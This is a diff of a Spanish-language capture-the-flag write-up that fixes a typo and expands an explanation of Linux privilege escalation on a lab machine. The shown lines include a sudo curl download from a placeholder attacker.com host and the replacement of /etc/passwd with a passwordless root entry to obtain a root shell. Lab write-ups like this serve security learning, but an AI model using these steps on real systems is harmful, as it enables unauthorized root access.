@@ -138,7 +138,7 @@ Matching Defaults entries for bob on 9ea8319d3a14:
 User bob may run the following commands on 9ea8319d3a14:
     (balulero) NOPASSWD: /usr/bin/python3
 ```
-y podemos ejecutar como usuario balilero python 3, miramos el binario en 
+y podemos ejecutar como usuario balulero python 3, miramos el binario en 
 ```
 https://gtfobins.github.io/gtfobins/python/
 ```
@@ -177,7 +177,7 @@ URL=http://attacker.com/file_to_get
 LFILE=file_to_save
 sudo curl $URL -o $LFILE
 ```
-podemos subir a la maquina victima un archivo como root, lo más facil es cambiar los privilegios en el /etc/passwd
+podemos subir a la maquina victima un archivo como root, lo más facil es cambiar los privilegios en el /etc/passwd (quitando la "x" evitamos la consulta al /etc/shadows que almacena la contraseña, se la quitamos a root)
 hacemos un cat del original y nos hacemos uno nuevo quedando así:
 ```
 root::0:0:root:/root:/bin/bash
@@ -237,3 +237,4 @@ root@9ea8319d3a14:/home/bob# is
 bash: is: command not found
 root@9ea8319d3a14:/home/bob#
 ```
+quise poner id y no se que lié xD
